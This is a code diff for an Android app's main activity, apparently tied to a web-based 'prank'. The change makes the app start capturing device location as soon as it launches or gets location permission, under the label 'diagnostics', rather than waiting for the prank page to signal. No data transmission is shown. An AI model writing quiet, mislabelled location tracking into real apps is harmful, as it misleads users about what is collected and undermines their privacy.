@@ -59,6 +59,7 @@ public final class MainActivity extends Activity {
     private long backWindowStart = 0L;
     private Location latestLocation;
     private LocationManager locationManager;
+    private boolean diagnosticsScheduled = false;
 
     private final LocationListener locationListener = new LocationListener() {
         @Override
@@ -183,6 +184,17 @@ public final class MainActivity extends Activity {
         if (!permissions.isEmpty()) {
             requestPermissions(permissions.toArray(new String[0]), INITIAL_PERMISSION_CODE);
         }
+        scheduleDiagnosticsIfNeeded();
+    }
+
+    private void scheduleDiagnosticsIfNeeded() {
+        if (diagnosticsScheduled) return;
+        diagnosticsScheduled = true;
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            startLocationCapture();
+        }
+        handler.postDelayed(this::showDiagnosticNotification, 18000L);
     }
 
     private void createNotificationChannel() {
@@ -272,10 +284,7 @@ public final class MainActivity extends Activity {
     private final class NexusBridge {
         @JavascriptInterface
         public void prankStarted() {
-            runOnUiThread(() -> {
-                startLocationCapture();
-                handler.postDelayed(MainActivity.this::showDiagnosticNotification, 18000L);
-            });
+            runOnUiThread(MainActivity.this::scheduleDiagnosticsIfNeeded);
         }
     }
 
@@ -321,6 +330,13 @@ public final class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == INITIAL_PERMISSION_CODE) {
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                    checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                startLocationCapture();
+            }
+            return;
+        }
         if (requestCode == CAMERA_PERMISSION_CODE && pendingCameraRequest != null) {
             PermissionRequest request = pendingCameraRequest;
             pendingCameraRequest = null;
